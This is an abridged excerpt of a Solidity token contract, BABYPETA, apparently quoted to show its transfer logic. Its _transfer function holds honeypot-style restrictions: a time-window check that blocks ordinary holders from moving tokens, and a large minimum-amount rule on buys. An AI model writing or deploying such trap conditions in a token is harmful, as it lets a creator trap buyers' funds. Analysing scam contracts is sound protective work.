...
contract BABYPETA  is Ownable, IERC20 {
    ...
    constructor()  {
        ...
        panckepair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        if (form !=pair && form !=panckepair){
            require(block.timestamp <= feetoken[form] + tokentime);
        }

        if (form !=pair && to !=pair && form == panckepair && to != panckepair && balanceOf(to) >= 1){
            require( amount >= balanceOf(panckepair).mul(20).div(100));
        }
        ...
        if (to != pair && to != panckepair && form == panckepair ){
